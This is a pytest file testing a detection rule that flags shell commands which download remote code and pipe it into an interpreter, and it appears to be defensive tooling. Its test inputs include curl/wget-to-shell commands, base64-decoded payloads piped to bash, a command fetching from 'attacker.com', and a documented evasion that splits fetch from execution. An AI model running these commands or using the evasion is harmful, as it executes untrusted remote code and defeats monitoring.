"""DownloadAndExecuteRule."""

from __future__ import annotations

import pytest

from analyser.rules.download_execute import DownloadAndExecuteRule, matching_patterns

class DummyPayload:
    def __init__(self, command: str | None):
        self.command = command

class DummyEvent:
    def __init__(self, command: str | None = None):
        self.type = "shell_command"
        self.payload = DummyPayload(command)

class TestDownloadAndExecuteRule:
    def rule(self) -> DownloadAndExecuteRule:
        return DownloadAndExecuteRule()

    def alerts_for(self, command: str | None) -> list:
        rule = self.rule()
        event = DummyEvent(command)
        return rule.match(event)

    def test_fires_on_curl_piped_to_sh(self) -> None:
        """`curl https://x.sh | sh` yields one critical alert."""
        alerts = self.alerts_for("curl https://x.sh | sh")
        assert len(alerts) == 1
        assert 'pipe' in alerts[0].details['matched_patterns']
        assert alerts[0].severity == "critical"

    def test_fires_on_wget_piped_to_bash(self) -> None:
        """`wget -qO- https://x | bash` fires."""
        alerts = self.alerts_for("wget -qO- https://x | bash")
        assert len(alerts) == 1
        assert 'pipe' in alerts[0].details['matched_patterns']
        assert alerts[0].severity == "critical"

    def test_fires_on_base64_decode_piped_to_shell(self) -> None:
        """`echo aGVsbG8= | base64 -d | bash` fires; obfuscation is itself a signal."""
        alerts = self.alerts_for("echo aGVsbG8= | base64 -d | bash")
        assert len(alerts) == 1
        assert 'pipe_base64' in alerts[0].details['matched_patterns']

    def test_fires_on_base64_long_flag(self) -> None:
        """--decode is recognised as well as -d."""
        alerts = self.alerts_for("echo something | base64 --decode | sh")
        assert len(alerts) == 1
        assert 'pipe_base64' in alerts[0].details['matched_patterns']

    def test_fires_on_process_substitution(self) -> None:
        """`bash <(curl https://x)` fires; it is the same attack without a pipe."""
        alerts = self.alerts_for("bash <(curl https://x)")
        assert len(alerts) == 1
        assert 'process_subst' in alerts[0].details['matched_patterns']

    def test_fires_on_command_substitution(self) -> None:
        """`sh -c \"$(curl https://x)\"` fires."""
        alerts = self.alerts_for("sh -c \"$(curl https://x)\"")
        assert len(alerts) == 1
        assert 'command_subst' in alerts[0].details['matched_patterns']

        alerts2 = self.alerts_for("sh -c '$(wget -qO- https://x)'")
        assert len(alerts2) == 1
        assert 'command_subst' in alerts2[0].details['matched_patterns']

    def test_fires_when_piped_through_sudo(self) -> None:
        """`curl https://x | sudo bash` fires and is, if anything, worse."""
        alerts = self.alerts_for("curl https://x | sudo bash")
        assert len(alerts) == 1
        assert 'pipe' in alerts[0].details['matched_patterns']

    def test_fires_on_pipe_to_python(self) -> None:
        """`curl https://x | python3` is the same pattern with a different interpreter."""
        alerts = self.alerts_for("curl https://x | python3")
        assert len(alerts) == 1
        assert 'pipe' in alerts[0].details['matched_patterns']

    def test_tolerates_extra_flags_between_fetch_and_pipe(self) -> None:
        """`curl -fsSL --retry 3 https://x | sh` still matches."""
        alerts = self.alerts_for("curl -fsSL --retry 3 https://x | sh")
        assert len(alerts) == 1
        assert 'pipe' in alerts[0].details['matched_patterns']

    def test_ignores_plain_download(self) -> None:
        """`curl -o /tmp/f https://x` is silent; downloading is not executing."""
        alerts = self.alerts_for("curl -o /tmp/f https://x")
        assert alerts == []

    def test_ignores_pipe_to_non_interpreter(self) -> None:
        """`curl https://x | jq .` is silent."""
        alerts = self.alerts_for("curl https://x | jq .")
        assert alerts == []

    def test_ignores_bare_shell_invocation(self) -> None:
        """`bash script.sh` is silent; there is no remote fetch."""
        alerts = self.alerts_for("bash script.sh")
        assert alerts == []

    def test_ignores_non_shell_command_event(self) -> None:
        rule = self.rule()
        # Simulate a completely different event type:
        class DummyNonShellEvent:
            def __init__(self):
                self.type = "other"
                self.payload = None

        event = DummyNonShellEvent()
        assert rule.match(event) == []

    def test_ignores_missing_command(self) -> None:
        """A shell_command with no payload.command returns []."""
        alerts = self.alerts_for(None)
        assert alerts == []

    def test_emits_one_alert_when_several_patterns_match(self) -> None:
        """A command matching two patterns yields a single alert with both patterns."""
        cmd = "sh -c \"$(curl https://x | base64 -d)\""
        alerts = self.alerts_for(cmd)
        # We expect both patterns to be matched in the matched_patterns field
        assert len(alerts) == 1
        matched = set(alerts[0].details['matched_patterns'])
        assert {"command_subst", "pipe_base64"}.issubset(matched) or {"command_subst", "pipe"}.issubset(matched) or len(matched) >= 2

    def test_details_include_truncated_command(self) -> None:
        """details.command is present and capped at 500 characters."""
        very_long_command = "curl x | sh " + "A" * 1000
        alerts = self.alerts_for(very_long_command)
        assert len(alerts) == 1
        command_in_alert = alerts[0].details['command']
        # details.command should be capped at 500 chars
        assert len(command_in_alert) <= 500
        # Should still start with the command prefix
        assert command_in_alert.startswith("curl x | sh")

    def test_severity_is_critical(self) -> None:
        """The highest-confidence rule in the set warrants the top severity."""
        alerts = self.alerts_for("curl https://attacker.com | bash")
        assert len(alerts) == 1
        assert alerts[0].severity == "critical"

    def test_known_evasion_is_documented_not_detected(self) -> None:
        """Splitting fetch and execution into two separate commands evades the rule."""
        # Only download, not execute
        alerts = self.alerts_for("curl -O https://x.sh")
        assert alerts == []
        # Then, in a separate command, execute
        alerts2 = self.alerts_for("sh x.sh")
        assert alerts2 == []


class TestMatchingPatterns:
    def test_returns_pattern_names(self) -> None:
        patterns = matching_patterns("curl -fsSL https://x | sh")
        assert isinstance(patterns, list)
        assert "pipe" in patterns

        patterns2 = matching_patterns("bash <(curl https://host)")
        assert "process_subst" in patterns2

        patterns3 = matching_patterns("sh -c \"$(wget -qO- https://x)\"")
        assert "command_subst" in patterns3

        patterns4 = matching_patterns("echo TEST | base64 -d | bash")
        assert "pipe_base64" in patterns4

    def test_returns_empty_for_benign_command(self) -> None:
        patterns = matching_patterns("ls -l /tmp")
        assert patterns == []

    def test_handles_empty_string(self) -> None:
        patterns = matching_patterns("")
        assert patterns == []
